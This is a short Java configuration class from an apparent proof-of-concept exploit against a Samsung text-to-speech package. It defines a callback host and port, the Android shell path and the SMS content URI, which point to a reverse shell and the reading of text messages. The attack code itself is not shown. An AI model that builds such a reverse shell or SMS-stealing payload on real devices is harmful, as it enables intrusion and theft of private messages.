package com.samsung.SMT.lang.poc;



public class Config_var {
    public static final String HOST = "192.168.1.73";
    public static final int PORT = 8888;
    public static final String SHELL_PATH = "/system/bin/sh";
    public static final String SMS_URL = "content://sms/";


}